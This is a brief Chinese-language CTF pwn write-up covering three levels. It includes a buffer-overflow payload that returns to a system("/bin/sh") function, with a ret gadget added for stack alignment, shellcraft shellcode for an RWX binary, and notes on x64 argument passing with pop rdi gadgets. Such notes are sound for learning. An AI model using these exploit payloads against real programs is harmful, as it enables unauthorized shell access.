### level0



> 000400596 callsystem      proc near
> .text:0000000000400596 ; __unwind {
> .text:0000000000400596                 push    rbp
> .text:0000000000400597                 mov     rbp, rsp
> .text:000000000040059A                 mov     edi, offset command ; "/bin/sh"
> .text:000000000040059F                 call    _system
> .text:00000000004005A4                 pop     rbp
> .text:00000000004005A5                 retn
> .text:00000000004005A5 ; } // starts at 400596

__一个简单的栈溢出，但是遇到一些小问题
直接使用payload=b'a'\*128+b'a'\* 8+p64(callsys_addr)会打不通
这个需要涉及到ubuntu调用system需要对齐栈的问题，需附加一个ret来保持堆栈平衡，比如我随便找了一个ret地址0x4005C5，payload变成b'A' * (0x80 + 0x8) + p64(0x4005C5) + p64(callsys_addr)。这样就能打得通了
另外，直接将callsys_adrr改为59A也能正常运行__

以下内若为瞎猜的：
如果返回地址是call XXX（或push bp，mov bp,sp）需要平衡
如果是普通语句可以不平衡

### level1

checksec 时发现__RWX:      Has RWX segments__
这时考虑shellcode = asm(shellcraft.sh())

### level2_x64
64位的传递参数通过rdi
利用pop rdi;ret来实现传参
前6个参数依次存放于 rdi、rsi、rdx、rcx、r8、r9 寄存器中
第7个以后的参数存放于栈中
